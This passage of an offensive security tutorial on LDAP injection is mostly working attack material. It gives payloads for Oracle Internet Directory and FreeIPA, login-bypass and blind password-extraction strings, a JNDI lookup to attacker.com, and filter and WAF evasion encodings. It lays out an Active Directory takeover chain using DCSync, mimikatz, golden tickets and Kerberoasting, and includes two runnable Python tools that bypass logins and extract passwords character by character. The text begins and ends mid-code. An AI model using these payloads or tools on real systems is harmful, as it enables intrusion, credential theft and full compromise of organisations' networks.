  *)(objectClass=domainDNS)(|(dc=*
  # Check attributes: minPwdLength, maxPwdAge, pwdHistoryLength, lockoutThreshold
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-server" label="Oracle Internet Directory"}

  ::code-group
  ```text [OID — Specific Payloads]
  # Oracle Internet Directory specific

  # Find all users
  *)(objectClass=orclUser)(|(uid=*
  *)(objectClass=orclUserV2)(|(uid=*

  # Find Oracle database links
  *)(objectClass=orclDBServer)(|(cn=*
  *)(objectClass=orclService)(|(cn=*

  # Find Oracle contexts
  *)(objectClass=orclContext)(|(cn=*

  # Oracle application server entries
  *)(objectClass=orclApplicationEntity)(|(cn=*

  # Wallet/credential entries
  *)(objectClass=orclCredential)(|(cn=*
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="389 Directory / FreeIPA"}

  ::code-group
  ```text [389 DS / FreeIPA — Specific Payloads]
  # FreeIPA uses 389 Directory Server

  # Find all hosts
  *)(objectClass=ipaHost)(|(fqdn=*

  # Find all services
  *)(objectClass=ipaService)(|(krbPrincipalName=*

  # Find all host groups
  *)(objectClass=ipaHostGroup)(|(cn=*

  # Find all user groups
  *)(objectClass=ipaUserGroup)(|(cn=*

  # Find HBAC rules (Host-Based Access Control)
  *)(objectClass=ipaHBACRule)(|(cn=*

  # Find sudo rules
  *)(objectClass=ipaSudoRule)(|(cn=*

  # Find Kerberos realms
  *)(objectClass=krbRealmContainer)(|(cn=*

  # Find OTP tokens
  *)(objectClass=ipaToken)(|(ipatokenUniqueID=*

  # Find certificate profiles
  *)(objectClass=ipaCertProfile)(|(cn=*
  ```
  ::
  :::
::

---

## Privilege Escalation via LDAP Injection

::warning
LDAP Injection against Active Directory environments is particularly devastating — it can provide a direct path to **domain administrator** access and **full enterprise compromise**.
::

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}

  ::steps{level="4"}

  #### Bypass authentication to access admin panel

  ```text
  Username: admin)(&))
  Password: anything
  
  # Or target specific admin account
  Username: *)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))(&)(|
  Password: anything
  ```

  #### Extract admin credentials via blind injection

  ```text
  # Extract admin password character by character
  admin)(userPassword=S*))(&)(|     → match
  admin)(userPassword=Se*))(&)(|    → match
  admin)(userPassword=Sec*))(&)(|   → match
  admin)(userPassword=Secr*))(&)(|  → match
  admin)(userPassword=Secre*))(&)(| → match
  admin)(userPassword=Secret*))(&)(|→ match
  # Password: "Secret123!"
  ```

  #### Login as domain admin

  ```bash
  # Use extracted credentials for domain access
  # Windows
  runas /user:DOMAIN\admin cmd
  
  # Linux
  smbclient //DC01/C$ -U 'DOMAIN\admin%Secret123!'
  evil-winrm -i DC01 -u admin -p 'Secret123!'
  ```

  #### Dump all domain credentials

  ```bash
  # DCSync attack with admin credentials
  secretsdump.py 'DOMAIN/admin:Secret123!@DC01'
  
  # Or via mimikatz
  mimikatz # lsadump::dcsync /domain:target.com /all
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="Full PrivEsc Chain"}

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | LDAP Injection auth bypass | Application access |
  | 2 | Blind extraction of AD admin password | Domain admin credentials |
  | 3 | Domain admin login (WinRM/RDP/SMB) | Domain controller access |
  | 4 | DCSync — dump all password hashes | All domain credentials |
  | 5 | Golden Ticket — forge Kerberos tickets | Persistent domain access |
  | 6 | Access file servers, databases, email | Full enterprise data |
  | 7 | Pivot to cloud (Azure AD Connect) | Cloud tenant compromise |
  | 8 | Access SaaS apps via SSO | Full organizational compromise |

  ::code-group
  ```bash [Step 3 — Access Domain Controller]
  # Evil-WinRM
  evil-winrm -i DC01.target.com -u admin -p 'Extracted_Password!'

  # PSExec
  psexec.py 'target.com/admin:Extracted_Password!@DC01.target.com'

  # WMI
  wmiexec.py 'target.com/admin:Extracted_Password!@DC01.target.com'

  # SMB
  smbclient //DC01.target.com/C$ -U 'target.com\admin%Extracted_Password!'
  ```

  ```bash [Step 4 — DCSync Attack]
  # Impacket secretsdump
  secretsdump.py 'target.com/admin:Extracted_Password!@DC01.target.com'

  # Output:
  # Administrator:500:aad3b435...:ntlm_hash:::
  # krbtgt:502:aad3b435...:ntlm_hash:::
  # ... (all domain users)

  # Mimikatz
  mimikatz # lsadump::dcsync /domain:target.com /user:Administrator
  mimikatz # lsadump::dcsync /domain:target.com /user:krbtgt
  ```

  ```bash [Step 5 — Golden Ticket]
  # With krbtgt hash, create persistent access
  ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain target.com Administrator

  # Use the golden ticket
  export KRB5CCNAME=Administrator.ccache
  psexec.py -k -no-pass target.com/Administrator@DC01.target.com
  ```

  ```bash [Step 6 — Enterprise Data Access]
  # Access file shares
  smbclient //FILESERVER/Finance$ -k -no-pass
  smbclient //FILESERVER/HR$ -k -no-pass
  smbclient //FILESERVER/IT$ -k -no-pass

  # Access Exchange
  ruler -k --email admin@target.com --domain target.com brute

  # Access databases
  mssqlclient.py -k -no-pass target.com/Administrator@SQLSERVER.target.com
  ```

  ```bash [Step 7 — Cloud Pivot]
  # If Azure AD Connect is present:
  # Extract Azure AD Connect credentials
  secretsdump.py -just-dc-user 'MSOL_*' target.com/Administrator@DC01

  # Use MSOL credentials for Azure AD access
  # Access Microsoft 365, Azure resources
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="LDAP → Application PrivEsc"}

  When LDAP injection is used against application-level authorization.

  ::code-group
  ```text [Modify Group Membership Check]
  # If app checks group membership via LDAP:
  # (&(uid=INPUT)(memberOf=cn=users,ou=Groups,...))

  # Inject to bypass group check
  Username: attacker)(memberOf=cn=admins,ou=Groups,dc=target,dc=com))(&)(|

  # The filter now checks if attacker is in admins group
  # But the injection makes it always true
  ```

  ```text [Role Escalation via Attribute Injection]
  # If app reads role from LDAP attribute:
  # Search: (&(uid=INPUT))  → returns user with 'role' attribute

  # Inject to match admin user instead
  Username: admin)(uid=admin))(&)(|
  # Returns admin's attributes including role=admin

  # Or match any user with admin role
  Username: *)(role=admin))(&)(|
  ```

  ```text [Access Control Bypass]
  # If app checks department for authorization:
  # (&(uid=INPUT)(department=Authorized_Dept))

  # Inject to bypass department check
  Username: attacker)(department=*))(&)(|
  # department=* matches any department → bypasses restriction

  # Or target specific department
  Username: attacker)(department=IT))(&)(|
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Credential Harvesting"}

  ::code-group
  ```text [Extract Credentials from Description Fields]
  # Many organizations store temporary/initial passwords in description
  
  # Blind extraction of description for each user:
  admin)(description=P*))(&)(|    → match (starts with P)
  admin)(description=Pa*))(&)(|   → match
  admin)(description=Pas*))(&)(|  → match
  admin)(description=Pass*))(&)(| → match
  # ... continue to extract "Password: TempPass123!"
  
  # Other fields that may contain credentials:
  admin)(info=*pass*))(&)(|
  admin)(comment=*cred*))(&)(|
  admin)(extensionAttribute1=*))(&)(|
  admin)(extensionAttribute2=*))(&)(|
  ```

  ```text [Extract Service Account Credentials]
  # Service accounts often have passwords in description
  *)(objectClass=person)(description=*password*)(|(uid=*
  *)(objectClass=person)(description=*pwd*)(|(uid=*
  *)(uid=svc_*)(description=*)(|(uid=*
  *)(uid=service_*)(description=*)(|(uid=*

  # Extract SPN for Kerberoasting
  *)(servicePrincipalName=*)(|(sAMAccountName=*
  # Then use extracted SPNs to request Kerberos tickets and crack offline
  ```

  ```bash [Kerberoasting with Extracted SPNs]
  # After extracting SPNs via LDAP injection:
  # SPN: MSSQLSvc/sql01.target.com:1433 → Account: svc_sql

  # Request TGS ticket
  GetUserSPNs.py -request -dc-ip DC01 'target.com/regular_user:password'

  # Crack the ticket offline
  hashcat -a 0 -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
  john tgs_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```
  ::
  :::
::

---

## Bypass Techniques

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Bypass: Input Filtering"}

  ::code-group
  ```text [Character Encoding Bypass]
  # URL encoding
  %2a                          = *
  %28                          = (
  %29                          = )
  %5c                          = \
  %00                          = NUL (null byte)
  %26                          = &
  %7c                          = |
  %21                          = !

  # Double encoding
  %252a                        = %2a → *
  %2528                        = %28 → (
  %2529                        = %29 → )

  # Unicode encoding
  %u002a                       = *
  %u0028                       = (
  %u0029                       = )

  # HTML entities
  &#42;                        = *
  &#40;                        = (
  &#41;                        = )
  &#x2a;                       = *
  &#x28;                       = (
  ```

  ```text [LDAP-Specific Hex Escaping]
  # LDAP allows hex-encoded characters
  \2a                          = *
  \28                          = (
  \29                          = )
  \5c                          = \
  \00                          = NUL

  # So instead of admin)(&))
  # Use: admin\29\28&\29\29
  # Which may bypass filters but still be processed by LDAP
  ```

  ```text [Case Variation]
  # LDAP attribute names are case-insensitive
  (UID=admin)       = (uid=admin)       = (Uid=admin)
  (OBJECTCLASS=*)   = (objectClass=*)   = (objectclass=*)
  (USERPASSWORD=*)  = (userPassword=*)  = (userpassword=*)
  (MEMBEROF=*)      = (memberOf=*)      = (memberof=*)
  ```

  ```text [Whitespace Injection]
  # Some parsers handle whitespace differently
  admin )(&))
  admin)( &))
  admin)(& ))
   admin)(&))
  admin)(&))%20
  admin%20)(&))

  # Tab injection
  admin%09)(&))
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-parentheses" label="Bypass: Parenthesis Filtering"}

  ::code-group
  ```text [When ( and ) Are Filtered]
  # Use null byte to truncate
  admin%00
  
  # Use LDAP hex escape
  admin\29\28&\29\29
  
  # Encoded parentheses
  admin%28%26%29%29
  admin%2528%2526%2529%2529
  
  # Mixed encoding
  admin)%28&%29)
  admin%29(%26)%29
  ```

  ```text [Alternative Filter Termination]
  # Instead of injecting closing parenthesis,
  # try to leverage existing filter structure

  # If filter is: (&(uid=INPUT)(pass=INPUT))
  # And ) is filtered, try:
  Username: *
  Password: *
  # This becomes: (&(uid=*)(pass=*)) — valid filter, matches all

  # Or use wildcard without parenthesis manipulation
  Username: admin
  Password: *
  # Becomes: (&(uid=admin)(pass=*)) — matches admin with any password
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-asterisk" label="Bypass: Wildcard Filtering"}

  ::code-group
  ```text [When * Is Filtered]
  # Use hex-encoded wildcard
  \2a

  # URL-encoded
  %2a

  # Double-encoded
  %252a

  # Unicode
  %u002a

  # LDAP substring matching (without explicit wildcard)
  # If filter uses substring match:
  # (cn=*INPUT*) → even without *, the INPUT itself is searched
  
  # Use very broad substring
  Username: a
  # Matches all entries containing 'a' (most entries)
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-lock" label="Bypass: WAF / Application Logic"}

  ::code-group
  ```text [Double Injection (Both Fields)]
  # If one field is sanitized but not the other:

  # Username sanitized, password not:
  Username: admin
  Password: *))(&)(|(uid=*

  # Password sanitized, username not:
  Username: admin)(userPassword=*))(&)(|
  Password: anything
  ```

  ```text [Parameter Pollution]
  # Send parameter multiple times
  username=admin&username=admin)(&))

  # Array parameters
  username[]=admin)(&))&password[]=anything

  # Different content types
  # If form is expected, try JSON:
  Content-Type: application/json
  {"username": "admin)(&))", "password": "anything"}

  # If JSON expected, try form:
  Content-Type: application/x-www-form-urlencoded
  username=admin)(%26))&password=anything
  ```

  ```text [Nested/Recursive Filter Injection]
  # Some WAFs check for simple patterns like )(&))
  # Use more complex nested structures:

  admin)(|(uid=admin)(uid=admin)))(&(objectClass=*
  admin)(!(!(uid=admin))))(&)(|
  admin)(&(|(uid=*)(uid=admin))))(|
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-wrench" label="Bypass: Framework-Specific"}

  ::code-group
  ```text [Java JNDI — InitialDirContext]
  # Java apps using JNDI/LDAP:
  # ctx.search(base, "(&(uid=" + username + ")(password=" + password + "))", ctrl);

  # Standard injection still applies
  Username: admin)(&))
  Password: anything

  # But also test JNDI-specific:
  # JNDI lookup injection (Log4Shell style)
  Username: ${jndi:ldap://attacker.com/exploit}
  
  # If using SearchControls with OBJECT_SCOPE:
  # The scope limits results — try changing scope via injection
  ```

  ```text [PHP — ldap_search]
  # PHP: ldap_search($conn, $base, "(&(uid=$user)(userPassword=$pass))");
  
  # PHP may process null bytes
  Username: admin)%00
  # Everything after %00 truncated in C-based ldap library

  # PHP string handling
  Username: admin\00)(&))
  ```

  ```text [Python — python-ldap]
  # Python: conn.search_s(base, ldap.SCOPE_SUBTREE, f"(&(uid={user})(pass={pwd}))")

  # Standard payloads work
  # Additionally test:
  Username: admin)\00
  Username: admin\x00
  
  # f-string specific edge cases
  Username: admin}{username
  ```

  ```text [.NET — DirectorySearcher]
  # C#: searcher.Filter = $"(&(sAMAccountName={username})(userPassword={password}))";

  # Standard payloads work
  # .NET may handle encoding differently
  Username: admin)(&))
  Username: admin%29%28%26%29%29
  ```
  ::
  :::
::

---

## Automated Exploitation

::code-collapse

```python [ldap_injection_scanner.py]
#!/usr/bin/env python3
"""
LDAP Injection Scanner — Multi-Technique Detection & Exploitation
Tests for authentication bypass, data extraction, and blind injection
For authorized penetration testing only
"""

import requests
import json
import sys
import time
import string
import re
from urllib.parse import quote
from dataclasses import dataclass, asdict
from typing import List, Optional

@dataclass
class LDAPIResult:
    technique: str
    parameter: str
    payload: str
    status_code: int
    response_length: int
    vulnerable: bool
    evidence: str
    severity: str
    extracted_data: str = ""

class LDAPIScanner:

    AUTH_BYPASS_PAYLOADS = [
        # Username field payloads
        ("admin)(&))", "anything", "AND bypass — always true"),
        ("admin)(|(uid=*))", "anything", "OR injection — match all"),
        ("*", "anything", "Wildcard — match all users"),
        ("*)(uid=*))(|(uid=*", "anything", "Complex wildcard chain"),
        ("admin)(!(&(1=0)))", "anything", "NOT-AND-false = true"),
        ("admin)(objectClass=*))(|(objectClass=*", "anything", "objectClass wildcard"),
        ("admin))(&(uid=admin", "anything", "Close-reopen filter"),
        ("admin%00", "anything", "Null byte truncation (URL encoded)"),
        ("admin)\\00", "anything", "Null byte truncation (LDAP escape)"),
        ("admin)(uid=admin))(&)(|", "anything", "AND injection with discard"),
        # Password field payloads
        ("admin", "*)(&", "Password AND bypass"),
        ("admin", "*", "Password wildcard"),
        ("admin", "*)(uid=*))(|(uid=*", "Password complex injection"),
        ("admin", "anything)(&))", "Password always-true injection"),
        # Both fields
        ("*", "*", "Both wildcards"),
        ("*)(uid=*", "*)(userPassword=*", "Both injected wildcards"),
    ]

    LDAP_ERRORS = [
        r"LDAP", r"ldap", r"javax\.naming", r"LDAPException",
        r"InvalidNameException", r"NamingException", r"directory",
        r"Distinguished Name", r"search filter", r"Bad search filter",
        r"filter error", r"unbalanced", r"parenthes",
        r"objectClass", r"uid=", r"cn=", r"ou=", r"dc=",
        r"dn:", r"sAMAccountName", r"Active Directory",
        r"LDAP://", r"ldap://", r"Invalid DN", r"No Such Object",
        r"DSID-", r"AcceptSecurityContext", r"NtStatus",
        r"LdapErr", r"SEC_E_", r"data 52e", r"data 775",
    ]

    def __init__(self, target_url, method='POST', username_param='username',
                 password_param='password'):
        self.target = target_url
        self.method = method.upper()
        self.user_param = username_param
        self.pass_param = password_param
        self.results: List[LDAPIResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.baseline = None

    def get_baseline(self):
        """Establish baseline for failed login"""
        print("[*] Establishing baseline (failed login)...")
        try:
            resp = self.session.post(self.target, data={
                self.user_param: 'definitely_invalid_user_xyz',
                self.pass_param: 'definitely_wrong_password_xyz'
            }, allow_redirects=False, timeout=10)

            self.baseline = {
                'status': resp.status_code,
                'length': len(resp.text),
                'body': resp.text[:1000]
            }
            print(f"    Baseline: HTTP {resp.status_code}, {len(resp.text)} bytes")
        except Exception as e:
            print(f"    [ERROR] {e}")

    def detect_ldap(self, response_text):
        """Check if response indicates LDAP backend"""
        for pattern in self.LDAP_ERRORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def is_bypass_successful(self, resp):
        """Determine if authentication was bypassed"""
        if self.baseline is None:
            return False

        # Different status code
        if resp.status_code != self.baseline['status']:
            if resp.status_code in [200, 301, 302, 303]:
                return True

        # Significant length difference
        len_diff = abs(len(resp.text) - self.baseline['length'])
        if len_diff > 50:
            # Check for success indicators
            success_words = ['welcome', 'dashboard', 'profile', 'logout',
                           'success', 'authenticated', 'token', 'session',
                           'logged', 'home', 'account']
            fail_words = ['invalid', 'incorrect', 'wrong', 'failed', 'error',
                        'denied', 'unauthorized', 'bad']

            body_lower = resp.text.lower()
            has_success = any(w in body_lower for w in success_words)
            has_fail = any(w in body_lower for w in fail_words)

            if has_success and not has_fail:
                return True
            if len_diff > 200 and not has_fail:
                return True

        # Redirect to authenticated area
        if resp.status_code in [301, 302, 303]:
            location = resp.headers.get('Location', '').lower()
            if any(w in location for w in ['dashboard', 'home', 'admin', 'profile', 'account']):
                return True

        # Session cookie set (different from baseline)
        resp_cookies = dict(resp.cookies)
        if resp_cookies and resp.status_code != self.baseline['status']:
            return True

        return False

    def test_auth_bypass(self):
        """Test LDAP injection authentication bypass"""
        print("\n[*] Testing LDAP authentication bypass...")

        for username, password, description in self.AUTH_BYPASS_PAYLOADS:
            try:
                data = {self.user_param: username, self.pass_param: password}

                if self.method == 'POST':
                    resp = self.session.post(self.target, data=data,
                        allow_redirects=False, timeout=10)
                else:
                    resp = self.session.get(self.target, params=data,
                        allow_redirects=False, timeout=10)

                success = self.is_bypass_successful(resp)
                ldap_detected = self.detect_ldap(resp.text)

                severity = "info"
                evidence = ""

                if success:
                    severity = "critical"
                    evidence = f"AUTH BYPASS — {description}"
                elif ldap_detected:
                    severity = "medium"
                    evidence = f"LDAP error detected — {description}"

                result = LDAPIResult(
                    technique=description,
                    parameter=self.user_param,
                    payload=username,
                    status_code=resp.status_code,
                    response_length=len(resp.text),
                    vulnerable=success,
                    evidence=evidence,
                    severity=severity
                )
                self.results.append(result)

                if success:
                    icon = "🔴"
                elif ldap_detected:
                    icon = "🟡"
                else:
                    icon = "🟢"

                print(f"    {icon} {description}: HTTP {resp.status_code} "
                      f"({len(resp.text)} bytes) {evidence}")

                if success:
                    return result

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")

        return None

    def test_error_detection(self):
        """Test for LDAP error exposure"""
        print("\n[*] Testing for LDAP error exposure...")

        error_payloads = [
            ")", ")(", "))", "((", "\\", ")()(", 
            "*)(objectClass=*", "admin)(cn=*",
            "x]([!(objectClass=*", ")(|",
            "&)(|)(", "!(uid=*",
        ]

        for payload in error_payloads:
            try:
                data = {self.user_param: payload, self.pass_param: 'test'}
                resp = self.session.post(self.target, data=data,
                    allow_redirects=False, timeout=10)

                if self.detect_ldap(resp.text):
                    result = LDAPIResult(
                        technique="LDAP Error Exposure",
                        parameter=self.user_param,
                        payload=payload,
                        status_code=resp.status_code,
                        response_length=len(resp.text),
                        vulnerable=True,
                        evidence=f"LDAP error exposed with payload: {payload}",
                        severity="medium"
                    )
                    self.results.append(result)
                    print(f"    🟡 LDAP error with: {payload}")

                    # Extract error details
                    for pattern in self.LDAP_ERRORS:
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        if match:
                            print(f"        Error: {match.group()}")

                time.sleep(0.2)

            except Exception as e:
                pass

    def test_wildcard_enumeration(self):
        """Test wildcard-based user enumeration"""
        print("\n[*] Testing wildcard user enumeration...")

        found_prefixes = []

        for char in string.ascii_lowercase + string.digits:
            try:
                data = {self.user_param: f"{char}*", self.pass_param: "*"}
                resp = self.session.post(self.target, data=data,
                    allow_redirects=False, timeout=10)

                if self.is_bypass_successful(resp):
                    found_prefixes.append(char)
                    print(f"    [+] Users starting with '{char}' exist")

                time.sleep(0.2)

            except Exception as e:
                pass

        if found_prefixes:
            print(f"\n    [*] User prefixes found: {found_prefixes}")
            return found_prefixes
        else:
            print(f"    [-] No wildcard enumeration possible")
            return []

    def blind_extract_attribute(self, username='admin', attribute='userPassword',
                                max_length=64):
        """Extract attribute value via blind LDAP injection"""
        print(f"\n[*] Blind extraction of '{attribute}' for user '{username}'...")

        charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"
        value = ""

        # Determine length
        print("  [*] Determining value length...")
        length = 0
        for l in range(1, max_length + 1):
            question_marks = "?" * l  # Exactly l characters
            payload = f"{username})({attribute}={question_marks}))(&)(|"

            try:
                resp = self.session.post(self.target, data={
                    self.user_param: payload,
                    self.pass_param: 'anything'
                }, allow_redirects=False, timeout=10)

                if self.is_bypass_successful(resp):
                    length = l
                    print(f"  [+] Value length: {length}")
                    break

                time.sleep(0.1)
            except:
                pass

        if not length:
            # Try alternative length detection with wildcards
            for l in range(1, max_length + 1):
                # Test if value has at least l characters
                dots = "?" * l + "*"
                payload = f"{username})({attribute}={dots}))(&)(|"
                try:
                    resp = self.session.post(self.target, data={
                        self.user_param: payload,
                        self.pass_param: 'anything'
                    }, allow_redirects=False, timeout=10)

                    if not self.is_bypass_successful(resp):
                        length = l - 1
                        if length > 0:
                            print(f"  [+] Value length (approx): {length}")
                        break
                    time.sleep(0.1)
                except:
                    pass

        if not length:
            print("  [-] Could not determine value length")
            return None

        # Extract character by character
        print(f"  [*] Extracting value ({length} characters)...")
        for pos in range(length):
            found = False
            for char in charset:
                # Escape LDAP special characters
                escaped_char = char
                if char in ['*', '(', ')', '\\', '\x00']:
                    escaped_char = f"\\{ord(char):02x}"

                test_value = ""
                for c in value:
                    if c in ['*', '(', ')', '\\', '\x00']:
                        test_value += f"\\{ord(c):02x}"
                    else:
                        test_value += c

                payload = f"{username})({attribute}={test_value}{escaped_char}*))(&)(|"

                try:
                    resp = self.session.post(self.target, data={
                        self.user_param: payload,
                        self.pass_param: 'anything'
                    }, allow_redirects=False, timeout=10)

                    if self.is_bypass_successful(resp):
                        value += char
                        sys.stdout.write(f"\r  [+] Extracted: {value}")
                        sys.stdout.flush()
                        found = True
                        break

                    time.sleep(0.05)
                except:
                    pass

            if not found:
                print(f"\n  [-] Stuck at position {pos + 1}")
                break

        if value:
            print(f"\n  [!!!] {attribute} for '{username}': {value}")

            result = LDAPIResult(
                technique="Blind Attribute Extraction",
                parameter=self.user_param,
                payload=f"blind extraction of {attribute}",
                status_code=0,
                response_length=0,
                vulnerable=True,
                evidence=f"Extracted {attribute} = {value}",
                severity="critical",
                extracted_data=value
            )
            self.results.append(result)

        return value

    def enumerate_users_blind(self, max_users=50):
        """Enumerate usernames via blind wildcard injection"""
        print("\n[*] Enumerating users via blind injection...")

        found_users = []
        prefixes = self.test_wildcard_enumeration()

        if not prefixes:
            prefixes = list(string.ascii_lowercase)

        charset = string.ascii_lowercase + string.digits + "_.-"

        for prefix in prefixes:
            current = prefix
            while len(current) < 30:
                found_next = False
                for char in charset:
                    test = current + char
                    payload = f"{test}*)({self.user_param}={test}*))(&)(|"

                    try:
                        resp = self.session.post(self.target, data={
                            self.user_param: payload,
                            self.pass_param: '*'
                        }, allow_redirects=False, timeout=10)

                        if self.is_bypass_successful(resp):
                            current = test
                            found_next = True

                            # Check if this is a complete username
                            exact_payload = f"{current})({self.user_param}={current}))(&)(|"
                            resp2 = self.session.post(self.target, data={
                                self.user_param: exact_payload,
                                self.pass_param: '*'
                            }, allow_redirects=False, timeout=10)

                            if self.is_bypass_successful(resp2):
                                if current not in found_users:
                                    found_users.append(current)
                                    print(f"    [+] Found user: {current}")

                            break

                        time.sleep(0.05)
                    except:
                        pass

                if not found_next:
                    break

        print(f"\n  [*] Found {len(found_users)} users: {found_users}")
        return found_users

    def generate_report(self):
        """Generate scan report"""
        vulnerable = [r for r in self.results if r.vulnerable]

        report = {
            "target": self.target,
            "total_tests": len(self.results),
            "vulnerabilities": len(vulnerable),
            "results": [asdict(r) for r in self.results]
        }

        filename = "ldap_injection_report.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{'='*65}")
        print(f" LDAP INJECTION SCAN COMPLETE")
        print(f"{'='*65}")
        print(f" Target:           {self.target}")
        print(f" Total tests:      {len(self.results)}")
        print(f" Vulnerabilities:  {len(vulnerable)}")
        print(f" Report:           {filename}")

        if vulnerable:
            print(f"\n 🔴 FINDINGS:")
            for v in vulnerable:
                print(f"    [{v.severity.upper()}] {v.technique}")
                print(f"      {v.evidence}")
                if v.extracted_data:
                    print(f"      Data: {v.extracted_data}")

        print(f"{'='*65}")
        return report

    def run_all(self):
        """Execute all LDAP injection tests"""
        print(f"{'='*65}")
        print(f" LDAP Injection Scanner")
        print(f" Target: {self.target}")
        print(f" Params: {self.user_param}, {self.pass_param}")
        print(f"{'='*65}")

        self.get_baseline()
        self.test_error_detection()
        bypass = self.test_auth_bypass()

        if bypass:
            print("\n[!!!] Auth bypass confirmed — attempting data extraction...")
            self.blind_extract_attribute('admin', 'userPassword')

        return self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <login_url> [username_param] [password_param]")
        print(f"Example: {sys.argv[0]} https://target.com/login username password")
        sys.exit(1)

    scanner = LDAPIScanner(
        target_url=sys.argv[1],
        username_param=sys.argv[2] if len(sys.argv) > 2 else 'username',
        password_param=sys.argv[3] if len(sys.argv) > 3 else 'password'
    )
    scanner.run_all()
```

::

::code-collapse

```python [ldap_blind_extractor.py]
#!/usr/bin/env python3
"""
LDAP Blind Data Extractor
Extracts attribute values character-by-character via blind injection
Supports multiple LDAP filter patterns
For authorized penetration testing only
"""

import requests
import string
import sys
import time
import json
import re

class LDAPBlindExtractor:

    FILTER_PATTERNS = {
        # Pattern name: (format_string, description)
        "and_uid": {
            "username": "{username})({attribute}={test_value}*))(&)(|",
            "description": "AND filter with uid: (&(uid=INJECT)(pass=...))"
        },
        "and_sam": {
            "username": "{username})({attribute}={test_value}*))(&)(|",
            "description": "AND filter with sAMAccountName"
        },
        "or_filter": {
            "username": "{username})({attribute}={test_value}*)(|(uid=*",
            "description": "OR filter injection"
        },
        "null_byte": {
            "username": "{username})({attribute}={test_value}*)%00",
            "description": "Null byte truncation"
        },
    }

    def __init__(self, target_url, username_param='username',
                 password_param='password', filter_pattern='and_uid'):
        self.target = target_url
        self.user_param = username_param
        self.pass_param = password_param
        self.pattern = self.FILTER_PATTERNS.get(filter_pattern,
                        self.FILTER_PATTERNS['and_uid'])
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0'
        })
        self.baseline = None
        self.charset = (
            string.ascii_lowercase +
            string.ascii_uppercase +
            string.digits +
            "!@#$%^&*()_+-=[]{}|;:',.<>?/~` "
        )
        self.request_count = 0

    def send_payload(self, username_value, password_value='anything'):
        """Send injection payload and return response"""
        self.request_count += 1
        try:
            resp = self.session.post(self.target, data={
                self.user_param: username_value,
                self.pass_param: password_value
            }, allow_redirects=False, timeout=10)
            return resp
        except:
            return None

    def is_match(self, resp):
        """Check if the response indicates a successful match"""
        if resp is None or self.baseline is None:
            return False

        # Different from baseline indicates match
        if resp.status_code != self.baseline['status']:
            if resp.status_code in [200, 301, 302, 303]:
                return True

        len_diff = abs(len(resp.text) - self.baseline['length'])
        if len_diff > 50:
            success_words = ['welcome', 'dashboard', 'success', 'authenticated',
                           'token', 'logged', 'profile']
            fail_words = ['invalid', 'incorrect', 'wrong', 'error', 'denied']
            
            body_lower = resp.text.lower()
            has_success = any(w in body_lower for w in success_words)
            has_fail = any(w in body_lower for w in fail_words)
            
            if has_success and not has_fail:
                return True
            if len_diff > 200 and not has_fail:
                return True

        return False

    def calibrate(self):
        """Calibrate true/false responses"""
        print("[*] Calibrating...")

        # Get false baseline
        resp_false = self.send_payload('definitely_invalid_user_xyz123', 'wrong')
        if resp_false:
            self.baseline = {
                'status': resp_false.status_code,
                'length': len(resp_false.text)
            }
            print(f"    False baseline: HTTP {resp_false.status_code}, "
                  f"{len(resp_false.text)} bytes")

        # Verify true detection
        resp_true = self.send_payload('admin)(&))', 'anything')
        if resp_true and self.is_match(resp_true):
            print(f"    True response:  HTTP {resp_true.status_code}, "
                  f"{len(resp_true.text)} bytes")
            print(f"    ✓ Calibration successful — injection confirmed")
            return True
        
        # Try alternative true payloads
        alt_payloads = ['*', 'admin)(uid=admin))(&)(|', 'admin)(objectClass=*))(&)(|']
        for payload in alt_payloads:
            resp = self.send_payload(payload, '*')
            if resp and self.is_match(resp):
                print(f"    ✓ Calibration successful with: {payload[:40]}")
                return True

        print("    ✗ Could not calibrate — injection may not work")
        return False

    def escape_ldap(self, char):
        """Escape LDAP special characters"""
        special = {'*': '\\2a', '(': '\\28', ')': '\\29',
                   '\\': '\\5c', '\x00': '\\00'}
        return special.get(char, char)

    def escape_value(self, value):
        """Escape an entire value string for LDAP filter"""
        return ''.join(self.escape_ldap(c) for c in value)

    def extract_attribute(self, target_user, attribute, max_length=128):
        """Extract attribute value character by character"""
        print(f"\n[*] Extracting '{attribute}' for user '{target_user}'...")

        value = ""
        consecutive_fails = 0

        for pos in range(max_length):
            found = False

            for char in self.charset:
                escaped_test = self.escape_value(value + char)

                payload = self.pattern['username'].format(
                    username=target_user,
                    attribute=attribute,
                    test_value=escaped_test
                )

                resp = self.send_payload(payload, 'anything')

                if resp and self.is_match(resp):
                    value += char
                    sys.stdout.write(f"\r    [{attribute}] = {value}")
                    sys.stdout.flush()
                    found = True
                    consecutive_fails = 0
                    break

                time.sleep(0.03)  # Rate limiting

            if not found:
                consecutive_fails += 1
                if consecutive_fails >= 1:
                    break

        print(f"\n    [+] Final value: {value}")
        print(f"    [*] Requests made: {self.request_count}")
        return value

    def extract_attribute_length(self, target_user, attribute, max_len=128):
        """Determine attribute value length"""
        print(f"  [*] Determining '{attribute}' length...")

        for length in range(1, max_len + 1):
